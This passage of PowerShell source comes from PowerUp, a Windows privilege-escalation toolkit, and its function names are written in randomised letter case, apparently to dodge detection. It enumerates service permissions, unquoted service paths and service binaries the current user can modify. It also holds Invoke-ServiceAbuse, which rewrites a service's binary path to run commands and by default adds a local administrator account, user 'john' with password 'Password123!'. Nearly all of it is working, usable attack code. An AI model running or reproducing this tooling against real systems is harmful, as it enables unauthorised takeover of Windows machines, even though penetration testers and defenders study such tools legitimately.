if ((-not $Result) -and ($LastError -eq 122) -and ($SizeNeeded -gt 0)) {
$BinarySecurityDescriptor = New-Object Byte[]($SizeNeeded)
$Result = $Advapi32::QueryServiceObjectSecurity($ServiceHandle, [Security.AccessControl.SecurityInfos]::DiscretionaryAcl, $BinarySecurityDescriptor, $BinarySecurityDescriptor.Count, [Ref] $SizeNeeded);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
if (-not $Result) {
Write-Error ([ComponentModel.Win32Exception] $LastError)
}
else {
$RawSecurityDescriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $BinarySecurityDescriptor, 0
$Dacl = $RawSecurityDescriptor.DiscretionaryAcl | ForEach-Object {
Add-Member -InputObject $_ -MemberType NoteProperty -Name AccessRights -Value ($_.AccessMask -as $ServiceAccessRights) -PassThru
}
Add-Member -InputObject $IndividualService -MemberType NoteProperty -Name Dacl -Value $Dacl -PassThru
}
}
else {
Write-Error ([ComponentModel.Win32Exception] $LastError)
}
$Null = $Advapi32::CloseServiceHandle($ServiceHandle)
}
}
}
}

fUnCtIoN Set-seRVICebiNaRYPaTh {
[Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
[OutputType('System.Boolean')]
[CmdletBinding()]
Param(
[Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
[Alias('ServiceName')]
[String[]]
[ValidateNotNullOrEmpty()]
$Name,
[Parameter(Position=1, Mandatory = $True)]
[Alias('BinaryPath', 'binPath')]
[String]
[ValidateNotNullOrEmpty()]
$Path
)
BEGIN {
filter Local:Get-ServiceConfigControlHandle {
[OutputType([IntPtr])]
Param(
[Parameter(Mandatory = $True, ValueFromPipeline = $True)]
[ServiceProcess.ServiceController]
[ValidateNotNullOrEmpty()]
$TargetService
)
$GetServiceHandle = [ServiceProcess.ServiceController].GetMethod('GetServiceHandle', [Reflection.BindingFlags] 'Instance, NonPublic')
$ConfigControl = 0x00000002
$RawHandle = $GetServiceHandle.Invoke($TargetService, @($ConfigControl))
$RawHandle
}
}
PROCESS {
ForEach($IndividualService in $Name) {
$TargetService = Get-Service -Name $IndividualService -ErrorAction Stop
try {
$ServiceHandle = Get-ServiceConfigControlHandle -TargetService $TargetService
}
catch {
$ServiceHandle = $Null
Write-Verbose "Error opening up the service handle with read control for $IndividualService : $_"
}
if ($ServiceHandle -and ($ServiceHandle -ne [IntPtr]::Zero)) {
$SERVICE_NO_CHANGE = [UInt32]::MaxValue
$Result = $Advapi32::ChangeServiceConfig($ServiceHandle, $SERVICE_NO_CHANGE, $SERVICE_NO_CHANGE, $SERVICE_NO_CHANGE, "$Path", [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
if ($Result -ne 0) {
Write-Verbose "binPath for $IndividualService successfully set to '$Path'"
$True
}
else {
Write-Error ([ComponentModel.Win32Exception] $LastError)
$Null
}
$Null = $Advapi32::CloseServiceHandle($ServiceHandle)
}
}
}
}

fUnCtIoN Test-sERvicEDACLperMiSsIOn {
[Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
[OutputType('ServiceProcess.ServiceController')]
[CmdletBinding()]
Param(
[Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
[Alias('ServiceName', 'Service')]
[String[]]
[ValidateNotNullOrEmpty()]
$Name,
[String[]]
[ValidateSet('QueryConfig', 'ChangeConfig', 'QueryStatus', 'EnumerateDependents', 'Start', 'Stop', 'PauseContinue', 'Interrogate', 'UserDefinedControl', 'Delete', 'ReadControl', 'WriteDac', 'WriteOwner', 'Synchronize', 'AccessSystemSecurity', 'GenericAll', 'GenericExecute', 'GenericWrite', 'GenericRead', 'AllAccess')]
$Permissions,
[String]
[ValidateSet('ChangeConfig', 'Restart', 'AllAccess')]
$PermissionSet = 'ChangeConfig'
)
BEGIN {
$AccessMask = @{
'QueryConfig'           = [uint32]'0x00000001'
'ChangeConfig'          = [uint32]'0x00000002'
'QueryStatus'           = [uint32]'0x00000004'
'EnumerateDependents'   = [uint32]'0x00000008'
'Start'                 = [uint32]'0x00000010'
'Stop'                  = [uint32]'0x00000020'
'PauseContinue'         = [uint32]'0x00000040'
'Interrogate'           = [uint32]'0x00000080'
'UserDefinedControl'    = [uint32]'0x00000100'
'Delete'                = [uint32]'0x00010000'
'ReadControl'           = [uint32]'0x00020000'
'WriteDac'              = [uint32]'0x00040000'
'WriteOwner'            = [uint32]'0x00080000'
'Synchronize'           = [uint32]'0x00100000'
'AccessSystemSecurity'  = [uint32]'0x01000000'
'GenericAll'            = [uint32]'0x10000000'
'GenericExecute'        = [uint32]'0x20000000'
'GenericWrite'          = [uint32]'0x40000000'
'GenericRead'           = [uint32]'0x80000000'
'AllAccess'             = [uint32]'0x000F01FF'
}
$CheckAllPermissionsInSet = $False
if ($PSBoundParameters['Permissions']) {
$TargetPermissions = $Permissions
}
else {
if ($PermissionSet -eq 'ChangeConfig') {
$TargetPermissions = @('ChangeConfig', 'WriteDac', 'WriteOwner', 'GenericAll', ' GenericWrite', 'AllAccess')
}
elseif ($PermissionSet -eq 'Restart') {
$TargetPermissions = @('Start', 'Stop')
$CheckAllPermissionsInSet = $True
}
elseif ($PermissionSet -eq 'AllAccess') {
$TargetPermissions = @('GenericAll', 'AllAccess')
}
}
}
PROCESS {
ForEach($IndividualService in $Name) {
$TargetService = $IndividualService | Add-ServiceDacl
if ($TargetService -and $TargetService.Dacl) {
$UserIdentity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
$CurrentUserSids = $UserIdentity.Groups | Select-Object -ExpandProperty Value
$CurrentUserSids += $UserIdentity.User.Value
ForEach($ServiceDacl in $TargetService.Dacl) {
if ($CurrentUserSids -contains $ServiceDacl.SecurityIdentifier) {
if ($CheckAllPermissionsInSet) {
$AllMatched = $True
ForEach($TargetPermission in $TargetPermissions) {
if (($ServiceDacl.AccessRights -band $AccessMask[$TargetPermission]) -ne $AccessMask[$TargetPermission]) {
$AllMatched = $False
break
}
}
if ($AllMatched) {
$TargetService
}
}
else {
ForEach($TargetPermission in $TargetPermissions) {
if (($ServiceDacl.AceType -eq 'AccessAllowed') -and ($ServiceDacl.AccessRights -band $AccessMask[$TargetPermission]) -eq $AccessMask[$TargetPermission]) {
Write-Verbose "Current user has '$TargetPermission' for $IndividualService"
$TargetService
break
}
}
}
}
}
}
else {
Write-Verbose "Error enumerating the Dacl for service $IndividualService"
}
}
}
}

fUnCtIoN Get-UNqUOtedserVicE {
[Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
[OutputType('PowerUp.UnquotedService')]
[CmdletBinding()]
Param()
$VulnServices = Get-WmiObject -Class win32_service | Where-Object {
$_ -and ($Null -ne $_.pathname) -and ($_.pathname.Trim() -ne '') -and (-not $_.pathname.StartsWith("`"")) -and (-not $_.pathname.StartsWith("'")) -and ($_.pathname.Substring(0, $_.pathname.ToLower().IndexOf('.exe') + 4)) -match '.* .*'
}
if ($VulnServices) {
ForEach ($Service in $VulnServices) {
$SplitPathArray = $Service.pathname.Split(' ')
$ConcatPathArray = @()
for ($i=0;$i -lt $SplitPathArray.Count; $i++) {
$ConcatPathArray += $SplitPathArray[0..$i] -join ' '
}
$ModifiableFiles = $ConcatPathArray | Get-ModifiablePath
$ModifiableFiles | Where-Object {$_ -and $_.ModifiablePath -and ($_.ModifiablePath -ne '')} | Foreach-Object {
$CanRestart = Test-ServiceDaclPermission -PermissionSet 'Restart' -Name $Service.name
$Out = New-Object PSObject
$Out | Add-Member Noteproperty 'ServiceName' $Service.name
$Out | Add-Member Noteproperty 'Path' $Service.pathname
$Out | Add-Member Noteproperty 'ModifiablePath' $_
$Out | Add-Member Noteproperty 'StartName' $Service.startname
$Out | Add-Member Noteproperty 'AbuseFunction' "Write-ServiceBinary -Name '$($Service.name)' -Path <HijackPath>"
$Out | Add-Member Noteproperty 'CanRestart' ([Bool]$CanRestart)
$Out | Add-Member Aliasproperty Name ServiceName
$Out.PSObject.TypeNames.Insert(0, 'PowerUp.UnquotedService')
$Out
}
}
}
}

fUnCtIoN Get-MODifIableserviCeFile {
[Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
[OutputType('PowerUp.ModifiableServiceFile')]
[CmdletBinding()]
Param()
Get-WMIObject -Class win32_service | Where-Object {$_ -and $_.pathname} | ForEach-Object {
$ServiceName = $_.name
$ServicePath = $_.pathname
$ServiceStartName = $_.startname
$ServicePath | Get-ModifiablePath | ForEach-Object {
$CanRestart = Test-ServiceDaclPermission -PermissionSet 'Restart' -Name $ServiceName
$Out = New-Object PSObject
$Out | Add-Member Noteproperty 'ServiceName' $ServiceName
$Out | Add-Member Noteproperty 'Path' $ServicePath
$Out | Add-Member Noteproperty 'ModifiableFile' $_.ModifiablePath
$Out | Add-Member Noteproperty 'ModifiableFilePermissions' $_.Permissions
$Out | Add-Member Noteproperty 'ModifiableFileIdentityReference' $_.IdentityReference
$Out | Add-Member Noteproperty 'StartName' $ServiceStartName
$Out | Add-Member Noteproperty 'AbuseFunction' "Install-ServiceBinary -Name '$ServiceName'"
$Out | Add-Member Noteproperty 'CanRestart' ([Bool]$CanRestart)
$Out | Add-Member Aliasproperty Name ServiceName
$Out.PSObject.TypeNames.Insert(0, 'PowerUp.ModifiableServiceFile')
$Out
}
}
}


fUnCtIoN GET-mODiFIaBLEsErvICE {
[Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
[OutputType('PowerUp.ModifiableService')]
[CmdletBinding()]
Param()
Get-Service | Test-ServiceDaclPermission -PermissionSet 'ChangeConfig' | ForEach-Object {
$ServiceDetails = $_ | Get-ServiceDetail
$CanRestart = $_ | Test-ServiceDaclPermission -PermissionSet 'Restart'
$Out = New-Object PSObject
$Out | Add-Member Noteproperty 'ServiceName' $ServiceDetails.name
$Out | Add-Member Noteproperty 'Path' $ServiceDetails.pathname
$Out | Add-Member Noteproperty 'StartName' $ServiceDetails.startname
$Out | Add-Member Noteproperty 'AbuseFunction' "Invoke-ServiceAbuse -Name '$($ServiceDetails.name)'"
$Out | Add-Member Noteproperty 'CanRestart' ([Bool]$CanRestart)
$Out | Add-Member Aliasproperty Name ServiceName
$Out.PSObject.TypeNames.Insert(0, 'PowerUp.ModifiableService')
$Out
}
}


fUnCtIoN Get-ServiceDetail {
[OutputType('PowerUp.ModifiableService')]
[CmdletBinding()]
Param(
[Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
[Alias('ServiceName')]
[String[]]
[ValidateNotNullOrEmpty()]
$Name
)
PROCESS {
ForEach($IndividualService in $Name) {
$TargetService = Get-Service -Name $IndividualService -ErrorAction Stop
if ($TargetService) {
Get-WmiObject -Class win32_service -Filter "Name='$($TargetService.Name)'" | Where-Object {$_} | ForEach-Object {
try {
$_
}
catch {
Write-Verbose "Error: $_"
}
}
}
}
}
}


fUnCtIoN InVokE-seRviCEaBuSe {
[Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
[Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingUserNameAndPassWordParams', '')]
[Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingPlainTextForPassword', '')]
[OutputType('PowerUp.AbusedService')]
[CmdletBinding()]
Param(
[Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
[Alias('ServiceName')]
[String[]]
[ValidateNotNullOrEmpty()]
$Name,
[ValidateNotNullOrEmpty()]
[String]
$UserName = 'john',
[ValidateNotNullOrEmpty()]
[String]
$Password = 'Password123!',
[ValidateNotNullOrEmpty()]
[String]
$LocalGroup = 'Administrators',
[Management.Automation.PSCredential]
[Management.Automation.CredentialAttribute()]
$Credential = [Management.Automation.PSCredential]::Empty,
[String]
[ValidateNotNullOrEmpty()]
$Command,
[Switch]
$Force
)
BEGIN {
if ($PSBoundParameters['Command']) {
$ServiceCommands = @($Command)
}
else {
if ($PSBoundParameters['Credential']) {
$UserNameToAdd = $Credential.UserName
$PasswordToAdd = $Credential.GetNetworkCredential().Password
}
else {
$UserNameToAdd = $UserName
$PasswordToAdd = $Password
}
if ($UserNameToAdd.Contains('\')) {
$ServiceCommands = @("net localgroup $LocalGroup $UserNameToAdd /add")
}
else {
$ServiceCommands = @("net user $UserNameToAdd $PasswordToAdd /add", "net localgroup $LocalGroup $UserNameToAdd /add")
}
}
}
PROCESS {
ForEach($IndividualService in $Name) {
$TargetService = Get-Service -Name $IndividualService -ErrorAction Stop
$ServiceDetails = $TargetService | Get-ServiceDetail
$RestoreDisabled = $False
if ($ServiceDetails.StartMode -match 'Disabled') {
Write-Verbose "Service '$(ServiceDetails.Name)' disabled, enabling..."
$TargetService | Set-Service -StartupType Manual -ErrorAction Stop
$RestoreDisabled = $True
}
$OriginalServicePath = $ServiceDetails.PathName
$OriginalServiceState = $ServiceDetails.State
Write-Verbose "Service '$($TargetService.Name)' original path: '$OriginalServicePath'"
Write-Verbose "Service '$($TargetService.Name)' original state: '$OriginalServiceState'"
ForEach($ServiceCommand in $ServiceCommands) {
if ($PSBoundParameters['Force']) {
$TargetService | Stop-Service -Force -ErrorAction Stop
}
else {
$TargetService | Stop-Service -ErrorAction Stop
}
Write-Verbose "Executing command '$ServiceCommand'"
$Success = $TargetService | Set-ServiceBinaryPath -Path "$ServiceCommand"
if (-not $Success) {
throw "Error reconfiguring the binary path for $($TargetService.Name)"
}
$TargetService | Start-Service -ErrorAction SilentlyContinue
Start-Sleep -Seconds 2
}
if ($PSBoundParameters['Force']) {
$TargetService | Stop-Service -Force -ErrorAction Stop
}
else {
$TargetService | Stop-Service -ErrorAction Stop
}
Write-Verbose "Restoring original path to service '$($TargetService.Name)'"
Start-Sleep -Seconds 1
$Success = $TargetService | Set-ServiceBinaryPath -Path "$OriginalServicePath"
if (-not $Success) {
throw "Error restoring the original binPath for $($TargetService.Name)"
}
if ($RestoreDisabled) {
Write-Verbose "Re-disabling service '$($TargetService.Name)'"
$TargetService | Set-Service -StartupType Disabled -ErrorAction Stop
}
elseif ($OriginalServiceState -eq "Paused") {
Write-Verbose "Starting and then pausing service '$($TargetService.Name)'"
$TargetService | Start-Service
Start-Sleep -Seconds 1
$TargetService | Set-Service -Status Paused -ErrorAction Stop
}
elseif ($OriginalServiceState -eq "Stopped") {
Write-Verbose "Leaving service '$($TargetService.Name)' in stopped state"
}
else {
Write-Verbose "Restarting '$($TargetService.Name)'"
$TargetService | Start-Service
}
$Out = New-Object PSObject
$Out | Add-Member Noteproperty 'ServiceAbused' $TargetService.Name
$Out | Add-Member Noteproperty 'Command' $($ServiceCommands -join ' && ')
$Out.PSObject.TypeNames.Insert(0, 'PowerUp.AbusedService')
$Out
}
}
}
